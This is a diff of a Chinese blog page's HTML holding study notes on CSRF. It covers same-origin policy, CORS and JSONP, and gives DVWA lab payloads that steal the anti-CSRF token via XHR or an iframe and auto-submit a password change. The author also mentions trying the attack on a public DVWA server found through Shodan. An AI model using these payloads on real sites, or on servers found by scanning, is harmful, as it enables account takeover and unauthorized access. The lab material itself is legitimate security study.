@@ -19,7 +19,7 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  CSRF漏洞学习笔记 &ndash; 阿富的在线稿子
+  CSRF漏洞学习笔记 &ndash; Arefu&#39;s Playground
 
     </title>
     
@@ -28,7 +28,7 @@ if (!doNotTrack) {
 |blog under go1f.cc">
     
 
-    <meta name="apple-mobile-web-app-title" content="阿富的在线稿子">
+    <meta name="apple-mobile-web-app-title" content="Arefu&#39;s Playground">
     
     
     <link rel="icon" href="/favicon-64.png">
@@ -40,7 +40,7 @@ if (!doNotTrack) {
     <meta name="twitter:card" content="summary">
     <meta name="twitter:site" content="@">
     <meta name="twitter:creator" content="@">
-    <meta name="twitter:title" content="CSRF漏洞学习笔记 | 阿富的在线稿子">
+    <meta name="twitter:title" content="CSRF漏洞学习笔记 | Arefu&#39;s Playground">
     <meta name="twitter:description" content="CSRF又很好防，只能钻钻漏洞这样子。|blog under go1f.cc">
     <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
     
@@ -58,7 +58,7 @@ if (!doNotTrack) {
       <div id="header" class="px-1 bg-white">
         <nav class="UnderlineNav UnderlineNav--right px-2">
   <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
-    阿富的在线稿子
+    Arefu&#39;s Playground
   </a>
 
   
@@ -86,14 +86,6 @@ if (!doNotTrack) {
     <a class="UnderlineNav-item " href="/blog/">
       
       <span>博客</span>
-    </a>
-    
-    
-    
-    
-    <a class="UnderlineNav-item " href="/about/">
-      
-      <span>简历</span>
     </a>
     
     
@@ -132,9 +124,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-02-02. Published at: 2020-02-01.">
+      <span title="Lastmod: 2020-02-15. Published at: 2020-02-01.">
         
-          Lastmod: 2020-02-02
+          Lastmod: 2020-02-15
         
       </span>
     </div>
@@ -146,7 +138,7 @@ if (!doNotTrack) {
   <section class="pb-6 mb-3 border-bottom">
     <p>CSRF又很好防，只能钻钻漏洞这样子。</p>
 <p>​</p>
-<h2 id="一些必要条件">一些必要条件</h2>
+<h2 id="一些前提">一些前提</h2>
 <ul>
 <li>没有二次验证（验证码/密码/token）</li>
 <li>在同一域名，或允许跨站请求的域名下找到XSS利用</li>
@@ -174,32 +166,33 @@ if (!doNotTrack) {
 </li>
 </ul>
 <h3 id="ajax跨域">AJAX跨域</h3>
-<p><a href="https://www.runoob.com/try/try.php?filename=tryajax_first">XHR</a></p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
-<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span><span class="s2">&#34;/response.php&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span><span class="p">;</span>
-<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">)</span><span class="p">;</span>
-<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;uname=root&amp;password=root123&#34;</span><span class="p">)</span><span class="p">;</span>  <span class="c1">//若POST方式，参数作post数据提交；并注意添加form的Content-Type header
-</span></code></pre></div><p>XHR使用是有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>(跨域资源共享)限制的，例如，在 <a href="http://test.cn">http://test.cn</a> 网站下，向目标网站发起跨站请求</p>
+<p><a href="https://www.runoob.com/try/try.php?filename=tryajax_first"><strong>XHR</strong></a></p>
+<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
+<span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span><span class="s2">&#34;/response.php&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span><span class="p">;</span>
+<span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">)</span><span class="p">;</span>
+<span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;uname=root&amp;password=root123&#34;</span><span class="p">)</span><span class="p">;</span>  
+<span class="c1">//POST提交，send()的参数作为data，并注意带上表单请求头
+</span></code></pre></div><p>XHR受<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>(跨域资源共享)限制，例如，在 <a href="http://test.cn">http://test.cn</a> 网站下，向目标网站发起跨站请求</p>
 <ol>
 <li>
 <p>需要发起请求头：<code>Origin: http://test.cn</code></p>
 </li>
 <li>
-<p>需要收到响应头：<code>Access-Control-Allow-Origin:  http://test.cn</code></p>
+<p>需要收到响应头：<code>Access-Control-Allow-Origin: http://test.cn</code></p>
 </li>
 </ol>
 <p>即使目标网站没有设置响应头，依然会收到请求，只是接收方收不到正常响应。</p>
-<p>PS: <strong>附带身份凭证</strong>的请求，即将XMLHttpRequest 的 <code>withCredentials</code> 标志设置为 <code>true</code>，从而向目标服务器发送 Cookies。（官方认可的发送Cookie方法，哈哈）</p>
+<p>PS: XHR自带传送Cookie方法： 添加<strong>附带身份凭证</strong>的请求，即将XMLHttpRequest 的 <code>withCredentials</code> 标志设置为 <code>true</code>，从而向目标服务器发送 Cookies。</p>
 <p>​</p>
 <h3 id="jsonp跨域">JSONP跨域</h3>
 <p>AJAX的核心是通过<code>XmlHttpRequest</code>获取非本页内容，而JSONP的核心则是动态添加<code>&lt;script&gt;</code>标签来调用服务器提供的js脚本。</p>
 <p>​</p>
 <p>​</p>
-<h2 id="dvwa-csrf">DVWA CSRF</h2>
+<h2 id="csrf演习-by-dvwa">CSRF演习 by DVWA</h2>
 <p>High Level的user_token获取，绕不开同源策略，只能在同一域名里寻找xss，借助xss漏洞完成攻击。</p>
-<h3 id="法一ajax">法一：AJAX</h3>
+<h3 id="0x01-ajax">0x01 AJAX</h3>
 <p>在shodan找到的公网上的一台配置了DVWA Web的服务器，本地127.0.0.1访问自己的payload。浏览器F12调试，结合console控制台warning信息、xmlhttp.readyState、xmlhttp.status的输出（见代码）。</p>
-<p>虽然第一个xhr发出去并收到了完整的网页（携带了token），但是参见warning信息：服务器响应头并没有Access-Control-Allow-Origin一项，于是浏览器阻止了进一步的ajax请求，xmlhttp.status=0。</p>
+<p>虽然第一个xhr发出去并收到了完整的网页（携带了token），但是参见warning信息：服务器响应头并没有Access-Control-Allow-Origin一项，于是浏览器阻止了进一步的ajax请求，获得返回状态码零。</p>
 <p>算是第一次实践，吃了同源策略的闭门羹。</p>
 <p><strong>payload</strong></p>
 <div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">theUrl</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/csrf/&#39;</span><span class="p">;</span>
@@ -237,24 +230,26 @@ if (!doNotTrack) {
 <span class="c1">//**注意：**当您使用 async=false 时，请不要编写 onreadystatechange 函数 - 把代码放到 send() 语句后面即可。
 </span><span class="c1"></span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
 </code></pre></div><p>​</p>
-<h3 id="法二iframe">法二：iframe</h3>
+<h3 id="0x02-iframe">0x02 iframe</h3>
 <p>构造表单提交。</p>
-<p>下面顺便介绍一下借助burpsuit的插件 Generate CSRF PoC。</p>
+<p>下面顺便介绍一下burpsuit的插件 Generate CSRF PoC。</p>
 <ol>
-<li>首先burp抓取修改密码的包</li>
+<li>burp抓取修改密码的请求包</li>
 </ol>
 <p><img src="https://i.loli.net/2020/02/02/F9Tsj3UeKdPvmDr.jpg" alt="DVWA_CSRF.jpg"></p>
+<p>​</p>
 <ol start="2">
 <li>Proxy-HTTP history选中关键链接，如图操作。</li>
 </ol>
 <p><img src="https://i.loli.net/2020/02/02/BnLuR9UPYoxkNXh.jpg" alt="Generate CSRF Poc.jpg"></p>
+<p>​</p>
 <ol start="3">
 <li>再自定义一下表单或Header，直接Copy Html使用啦。</li>
 </ol>
 <p><img src="https://i.loli.net/2020/02/02/F5RNcWbLj76v3go.jpg" alt="CSRF Poc generator.jpg"></p>
+<p>​</p>
 <p><strong>Payload</strong></p>
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">get_token()</span><span class="p"></span><span class="p">&gt;</span> 
-<span class="c">&lt;!--</span><span class="c"> 等待onload再执行script！！！！</span><span class="c">--&gt;</span>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">get_token()</span><span class="p"></span><span class="p">&gt;</span>  <span class="c">&lt;!--</span><span class="c"> 等待onload再执行script！！！！</span><span class="c">--&gt;</span>
 <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/dvwa/vulnerabilities/csrf/&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;test&#34;</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">iframe</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;csrf&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/dvwa/vulnerabilities/csrf/&#34;</span><span class="p"></span><span class="p">&gt;</span>
   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&amp;#95;new&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;admin3&#34;</span> <span class="p">/</span><span class="p">&gt;</span>
@@ -316,17 +311,17 @@ if (!doNotTrack) {
     <div id="toc" class="Box Box--blue mb-3">
       <b>CSRF漏洞学习笔记</b><nav id="TableOfContents">
   <ul>
-    <li><a href="#一些必要条件">一些必要条件</a></li>
+    <li><a href="#一些前提">一些前提</a></li>
     <li><a href="#同源策略">同源策略</a>
       <ul>
         <li><a href="#ajax跨域">AJAX跨域</a></li>
         <li><a href="#jsonp跨域">JSONP跨域</a></li>
       </ul>
     </li>
-    <li><a href="#dvwa-csrf">DVWA CSRF</a>
+    <li><a href="#csrf演习-by-dvwa">CSRF演习 by DVWA</a>
       <ul>
-        <li><a href="#法一ajax">法一：AJAX</a></li>
-        <li><a href="#法二iframe">法二：iframe</a></li>
+        <li><a href="#0x01-ajax">0x01 AJAX</a></li>
+        <li><a href="#0x02-iframe">0x02 iframe</a></li>
       </ul>
     </li>
     <li><a href="#参考扩展阅读">参考/扩展阅读</a></li>
